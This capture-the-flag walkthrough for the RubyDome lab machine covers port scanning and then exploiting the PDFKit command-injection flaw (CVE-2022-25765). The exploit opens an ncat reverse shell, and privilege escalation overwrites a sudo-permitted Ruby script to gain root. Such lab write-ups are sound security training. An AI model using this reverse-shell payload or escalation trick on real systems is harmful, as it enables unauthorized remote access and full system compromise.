_____
# Walkthrough for RubyDome

## Enumeration

- Running a full port scan on `nmap`

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 844f9c9e49bbd201bc740395a88d7c11 (ECDSA)
|_  256 311878726c1a0b920b83caff4da2e84a (ED25519)
3000/tcp open  http    WEBrick httpd 1.7.0 (Ruby 3.0.2 (2021-07-07))
|_http-server-header: WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)
|_http-title: RubyDome HTML to PDF
MAC Address: 08:00:27:99:9A:FD (Oracle VirtualBox virtual NIC) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Port 3000,22 are open. Heading to `http://192.168.1.33:3000`, we see a webpage with a form to convert a webpage to pdf.
- It had the title `RubyDome HTML to PDF`.
- If I input `https://www.google.com` and click `Convert to PDF`, it redirects me `http://192.168.1.33:3000/pdf`. The pdf contains the content of `https://www.google.com`.
- If I invoke an error, then I can enumerate the service used to convert to pdf. Since the html page contained a URL Validation. I intercepted the request with Burp Suite and modified the url to `ssdnf`.
- It responds with `500` status code. The error message contains `PDFKit::ImproperWkhtmltopdfExitStatus at /pdf`. This means the service is using `PDFKit` gem.
- If we search for pdfkit on exploit-db, we can find a [CVE-2022–25765](https://www.exploit-db.com/exploits/51293) exploit. It is a remote code execution exploit.

## Exploitation

- I downloaded the exploit to my machine and then ran the following command after starting a netcat listener on port 1234.

```c
┌──(root💀kali)-[~/boxes/rubydome]
└─# python3 exploit.py  -w 'http://192.168.1.33:3000/pdf' -p url  -c 'ncat -e /bin/bash 192.168.1.99 1234'

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-|       / / / / |/ /  _/ ___/ __ / _ / _ 
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....

UNICORD: Exploit for CVE-2022–25765 (pdfkit) - Command Injection
OPTIONS: Custom Command Send to Target Website Mode
PAYLOAD: http://%20`ncat -e /bin/bash 192.168.1.99 1234`
WARNING: Wrap custom command in "quotes" if it has spaces.
WEBSITE: http://192.168.1.33:3000/pdf
POSTARG: url'
```

```c
┌──(root💀kali)-[~/boxes/rubydome]
└─# nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.1.99] from (UNKNOWN) [192.168.1.33] 48464
whoami
andrew
```

## Privilege Escalation

Taking a look at sudo entries for user andrew we find the following.

```c
$ sudo -l
Matching Defaults entries for andrew on rubydome:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, use_pty

User andrew may run the following commands on rubydome:
    (ALL) NOPASSWD: /usr/bin/ruby /home/andrew/app/app.rb
```

This means that andrew is able to run `app.rb` with binary `ruby` with root privileges without having a need of password.

We can simply add our malicious payload to `app.rb` and can execute the app.rb file with root privileges.

```
echo 'exec "/bin/bash"' > app.rb
sudo /usr/bin/ruby /home/andrew/app/app.rb
id
uid=0(root) gid=0(root) groups=0(root)
```
